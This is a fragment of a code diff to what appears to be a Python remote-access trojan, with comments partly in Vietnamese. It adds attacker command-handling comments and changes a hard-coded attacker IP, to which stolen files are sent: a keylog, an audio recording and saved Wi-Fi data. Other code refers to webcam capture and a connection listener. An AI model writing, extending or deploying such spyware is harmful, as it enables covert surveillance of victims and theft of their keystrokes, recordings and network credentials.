@@ -163,7 +163,10 @@ def R_tcp(host='0.0.0.0', port=5000):
         client_socket, client_address = s.accept()
         print(f"{client_address[0]}:{client_address[1]} Connected!")
         
-        
+        # Gửi thông báo "Hacked!" chỉ một lần sau khi kết nối thành công
+      
+
+        # Xử lý lệnh từ attacker trong một thread riêng
         threading.Thread(target=handle_client, args=(client_socket,)).start()
 
 def capturevid(conn):
@@ -269,7 +272,7 @@ if __name__ == "__main__":
         threadcam.start()
     
     # Send files to attacker
-    attacker_host = '192.168.1.67'  # Assuming the attacker's IP is the same as the listening IP
+    attacker_host = '192.168.1.5'  # Assuming the attacker's IP is the same as the listening IP
     file_transfer_port = options.port + 3  # Using a new port for file transfer
     
     files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
